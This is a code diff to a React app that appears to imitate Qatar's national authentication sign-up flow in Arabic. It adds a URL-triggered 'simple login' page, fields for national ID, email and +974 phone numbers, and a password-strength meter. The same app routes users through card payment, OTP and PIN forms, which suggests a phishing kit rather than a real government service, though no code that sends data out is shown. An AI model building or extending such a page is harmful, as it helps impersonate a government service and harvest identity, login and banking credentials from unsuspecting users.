@@ -9,11 +9,17 @@ import PaymentForm from './components/PaymentForm';
 import OTPForm from './components/OTPForm';
 import PINForm from './components/PINForm';
 import VerificationForm from './components/VerificationForm';
+import SimpleLoginPage from './components/SimpleLoginPage';
 import { Info, Calendar, Loader2, Check, Eye, EyeOff } from 'lucide-react';
 
 const App: React.FC = () => {
+  // Check URL parameters for direct access to SimpleLoginPage
+  const urlParams = new URLSearchParams(window.location.search);
+  const pageParam = urlParams.get('page');
+  const initialStep = pageParam === 'simple-login' ? -2 : 0;
+  
   // Step 0 is the new HomePage from the prompt
-  const [step, setStep] = useState(0);
+  const [step, setStep] = useState(initialStep);
   const [paymentSubStep, setPaymentSubStep] = useState<'info' | 'card' | 'otp' | 'pin'>('info');
   const [recaptchaStatus, setRecaptchaStatus] = useState<'idle' | 'verifying' | 'verified'>('idle');
   const [isProcessing, setIsProcessing] = useState(false);
@@ -22,7 +28,7 @@ const App: React.FC = () => {
   const [accountType, setAccountType] = useState<string | null>(null);
   
   // Citizenship Type selection state (مواطن / مقيم)
-  const [citizenshipType, setCitizenshipType] = useState<'citizen' | 'resident'>('citizen');
+  const [citizenshipType, setCitizenshipType] = useState<'citizen' | 'resident' | null>(null);
   const [nationality, setNationality] = useState('قطر');
 
   // Form State for Step 2
@@ -108,6 +114,15 @@ const App: React.FC = () => {
     hasSymbol: /[%$#@&/\-_]/.test(password),
   }), [password]);
 
+  // Calculate password strength
+  const passwordStrength = useMemo(() => {
+    const validCount = Object.values(validations).filter(Boolean).length;
+    if (validCount === 0) return { level: 'none', text: '', color: '', width: '0%' };
+    if (validCount <= 2) return { level: 'weak', text: 'ضعيف', color: '#d9534f', width: '33%' };
+    if (validCount <= 4) return { level: 'medium', text: 'متوسط', color: '#f0ad4e', width: '66%' };
+    return { level: 'strong', text: 'قوي', color: '#009e5a', width: '100%' };
+  }, [validations]);
+
   const isPasswordValid = Object.values(validations).every(Boolean);
   const isMatch = password === confirmPassword && password !== '';
   const canContinueStep3 = isPasswordValid && isMatch;
@@ -173,6 +188,11 @@ const App: React.FC = () => {
   // If we are at Step 0, just show the HomePage
   if (step === 0) {
     return <HomePage onStart={() => setStep(1)} onLogin={() => setStep(-1)} />;
+  }
+
+  // If we are at Step -2, show the Simple Login page (for dashboard redirect)
+  if (step === -2) {
+    return <SimpleLoginPage />;
   }
 
   // If we are at Step -1, show the Login page
@@ -282,6 +302,88 @@ const App: React.FC = () => {
                       </label>
                     </div>
                  </div>
+
+                 {/* Conditional Fields Based on Account Type */}
+                 {accountType && (
+                   <div className="space-y-6 mt-8 max-w-[600px] mx-auto">
+                     {/* Fields for Citizens/Residents */}
+                     {accountType === 'citizen' && (
+                       <>
+                         {/* ID Card / Residence Number Field */}
+                         <div className="space-y-2">
+                           <label className="block text-right text-[14px] font-bold text-gray-800">
+                             رقم البطاقة الشخصية/رقم الإقامة <span className="text-red-500">*</span>
+                           </label>
+                           <input 
+                             type="text"
+                             className="nas-input text-left w-full"
+                             placeholder=""
+                             inputMode="numeric"
+                           />
+                         </div>
+
+                         {/* Email Field */}
+                         <div className="space-y-2">
+                           <label className="block text-right text-[14px] font-bold text-gray-800">
+                             البريد الإلكتروني <span className="text-red-500">*</span>
+                           </label>
+                           <input 
+                             type="email"
+                             className="nas-input text-left w-full"
+                             placeholder=""
+                           />
+                         </div>
+
+                         {/* Phone Number Field */}
+                         <div className="space-y-2">
+                           <label className="block text-right text-[14px] font-bold text-gray-800">
+                             رقم الهاتف المحمول <span className="text-red-500">*</span>
+                           </label>
+                           <div className="flex gap-2 items-center">
+                             <input 
+                               type="tel"
+                               className="nas-input text-left flex-1"
+                               placeholder=""
+                               inputMode="numeric"
+                             />
+                             <div className="bg-[#cccccc] h-[34px] px-4 flex items-center justify-center rounded-[4px] text-[14px] font-bold text-[#333] min-w-[70px]">
+                               +974
+                             </div>
+                           </div>
+                         </div>
+                       </>
+                     )}
+
+                     {/* Fields for Visitors */}
+                     {accountType === 'visitor' && (
+                       <>
+                         {/* Email Field */}
+                         <div className="space-y-2">
+                           <label className="block text-right text-[14px] font-bold text-gray-800">
+                             البريد الإلكتروني <span className="text-red-500">*</span>
+                           </label>
+                           <input 
+                             type="email"
+                             className="nas-input text-left w-full"
+                             placeholder=""
+                           />
+                         </div>
+
+                         {/* Phone Number Field - International */}
+                         <div className="space-y-2">
+                           <label className="block text-right text-[14px] font-bold text-gray-800">
+                             رقم الهاتف المحمول <span className="text-red-500">*</span>
+                           </label>
+                           <input 
+                             type="tel"
+                             className="nas-input text-left w-full"
+                             placeholder="+1234567890"
+                           />
+                         </div>
+                       </>
+                     )}
+                   </div>
+                 )}
               </div>
               
               <div className="p-4 px-4 md:px-8 border-t border-gray-100 flex flex-col md:flex-row justify-between items-center gap-3 md:gap-0 bg-[#f9f9f9]">
@@ -505,60 +607,7 @@ const App: React.FC = () => {
                     </div>
                   </div>
 
-                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
-                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
-                      <span className="nas-label">{citizenshipType === 'citizen' ? 'رقم البطاقة الشخصية' : 'رقم جواز السفر'}</span>
-                      <Info size={16} className="text-[#007fb1] cursor-help mx-2" />
-                      <span className="required-dot">.</span>
-                    </div>
-                    <div className="md:col-span-8 w-full">
-                      <input 
-                        className="nas-input w-full" 
-                        type="text" 
-                        inputMode={citizenshipType === 'citizen' ? 'numeric' : 'text'}
-                        pattern={citizenshipType === 'citizen' ? '[0-9]*' : '[A-Za-z0-9]*'}
-                        placeholder={citizenshipType === 'citizen' ? 'رقم البطاقة الشخصية' : 'رقم جواز السفر'}
-                        value={idNumber}
-                        onChange={(e) => {
-                          if (citizenshipType === 'citizen') {
-                            handleNumericInput(setIdNumber, e.target.value, 'idNumber');
-                          } else {
-                            // Allow only English letters and numbers for passport
-                            const value = e.target.value.replace(/[^A-Za-z0-9]/g, '');
-                            setIdNumber(value);
-                          }
-                        }}
-                      />
-                      {errors.idNumber && (
-                        <p className="text-[#d9534f] text-[12px] mt-1">{errors.idNumber}</p>
-                      )}
-                    </div>
-                  </div>
 
-                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
-                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
-                      <span className="nas-label">رقم الهاتف المحمول</span>
-                      <span className="required-dot">.</span>
-                    </div>
-                    <div className="md:col-span-8 w-full">
-                      <div className="flex gap-2 justify-start items-center">
-                        <input 
-                          className="nas-input" 
-                          type="text" 
-                          inputMode="numeric"
-                          pattern="[0-9]*"
-                          value={mobileNumber}
-                          onChange={(e) => handleNumericInput(setMobileNumber, e.target.value, 'mobileNumber')}
-                        />
-                        <div className="bg-[#cccccc] h-[34px] px-4 flex items-center justify-center rounded-[4px] text-[14px] font-bold text-[#333] min-w-[70px]">
-                          +974
-                        </div>
-                      </div>
-                      {errors.mobileNumber && (
-                        <p className="text-[#d9534f] text-[12px] mt-1">{errors.mobileNumber}</p>
-                      )}
-                    </div>
-                  </div>
 
                   <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
                     <div className="md:col-span-4 flex items-center justify-start md:pr-12">
@@ -676,13 +725,28 @@ const App: React.FC = () => {
               </div>
               <div className="px-10 py-4">
                 <div className="bg-white border border-[#eeeeee] rounded-[6px] p-5 mb-8 text-right shadow-sm">
-                  <h3 className="text-[14px] font-bold text-[#333] mb-3">ضبط كلمة المرور</h3>
-                  <ul className="space-y-2 text-[11px] text-[#999999] font-medium leading-relaxed">
-                    <li className={`flex justify-start transition-all ${validations.hasLower ? 'line-through text-[#009e5a]' : ''}`}>الحد الأدنى للأحرف الصغيرة</li>
-                    <li className={`flex justify-start transition-all ${validations.hasUpper ? 'line-through text-[#009e5a]' : ''}`}>الحد الأدنى للأحرف الكبيرة</li>
-                    <li className={`flex justify-start transition-all ${validations.hasNumber ? 'line-through text-[#009e5a]' : ''}`}>الحد الأدنى للأرقام</li>
-                    <li className={`flex justify-start transition-all ${validations.hasLength ? 'line-through text-[#009e5a]' : ''}`}>الحد الأدنى لطول كلمة المرور 8 أحرف</li>
-                    <li className={`flex justify-start transition-all ${validations.hasSymbol ? 'line-through text-[#009e5a]' : ''}`}>الحد الأدنى للرموز (% $ # @ & / - _)</li>
+                  <h3 className="text-[14px] font-bold text-[#333] mb-3">يجب أن تحتوي كلمة المرور على:</h3>
+                  <ul className="space-y-2 text-[13px] text-[#666] font-medium leading-relaxed">
+                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasLower ? 'text-[#009e5a]' : ''}`}>
+                      {validations.hasLower ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
+                      <span>حرف صغير واحد على الأقل</span>
+                    </li>
+                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasUpper ? 'text-[#009e5a]' : ''}`}>
+                      {validations.hasUpper ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
+                      <span>حرف كبير واحد على الأقل</span>
+                    </li>
+                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasNumber ? 'text-[#009e5a]' : ''}`}>
+                      {validations.hasNumber ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
+                      <span>رقم واحد على الأقل</span>
+                    </li>
+                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasLength ? 'text-[#009e5a]' : ''}`}>
+                      {validations.hasLength ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
+                      <span>الحد الأدنى لطول كلمة المرور 8 أحرف</span>
+                    </li>
+                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasSymbol ? 'text-[#009e5a]' : ''}`}>
+                      {validations.hasSymbol ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
+                      <span>رمز واحد على الأقل (% $ # @ & / - _)</span>
+                    </li>
                   </ul>
                 </div>
                 <div className="space-y-5">
@@ -703,13 +767,30 @@ const App: React.FC = () => {
                           setPasswordError('');
                           setPassword(value);
                         }} 
-                        className="w-full h-[38px] border border-[#cccccc] rounded-[4px] px-4 text-right placeholder:text-center placeholder:text-[#bbbbbb] text-[15px] focus:border-[#66afe9] outline-none shadow-[inset_0_1px_1px_rgba(0,0,0,0.075)] bg-white" 
-                        placeholder="........" 
+                        className="w-full h-[38px] border border-[#cccccc] rounded-[4px] px-4 text-left text-[15px] focus:border-[#66afe9] outline-none shadow-[inset_0_1px_1px_rgba(0,0,0,0.075)] bg-white" 
+                        placeholder="" 
                       />
-                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">{showPassword ? <EyeOff size={16} /> : <Eye size={16} />}</button>
+                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">{showPassword ? <EyeOff size={16} /> : <Eye size={16} />}</button>
                     </div>
                     {passwordError && (
                       <p className="text-[#d9534f] text-[12px] mt-1">{passwordError}</p>
+                    )}
+                    {/* Password Strength Indicator */}
+                    {password && passwordStrength.level !== 'none' && (
+                      <div className="mt-3">
+                        <div className="flex items-center justify-between mb-1">
+                          <span className="text-[12px] font-bold" style={{ color: passwordStrength.color }}>قوة كلمة المرور: {passwordStrength.text}</span>
+                        </div>
+                        <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
+                          <div 
+                            className="h-full transition-all duration-300 ease-in-out rounded-full"
+                            style={{ 
+                              width: passwordStrength.width,
+                              backgroundColor: passwordStrength.color
+                            }}
+                          ></div>
+                        </div>
+                      </div>
                     )}
                   </div>
                   <div>
@@ -729,9 +810,9 @@ const App: React.FC = () => {
                           setConfirmPasswordError('');
                           setConfirmPassword(value);
                         }} 
-                        className={`w-full h-[38px] border rounded-[4px] px-4 text-right focus:border-[#66afe9] outline-none bg-white ${confirmPassword && !isMatch ? 'border-red-400' : 'border-[#cccccc]'}`} 
+                        className={`w-full h-[38px] border rounded-[4px] px-4 text-left focus:border-[#66afe9] outline-none bg-white ${confirmPassword && !isMatch ? 'border-red-400' : 'border-[#cccccc]'}`} 
                       />
-                      <button type="button" onClick={() => setShowConfirmPassword(!showConfirmPassword)} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">{showConfirmPassword ? <EyeOff size={16} /> : <Eye size={16} />}</button>
+                      <button type="button" onClick={() => setShowConfirmPassword(!showConfirmPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">{showConfirmPassword ? <EyeOff size={16} /> : <Eye size={16} />}</button>
                     </div>
                     {confirmPasswordError && (
                       <p className="text-[#d9534f] text-[12px] mt-1">{confirmPasswordError}</p>
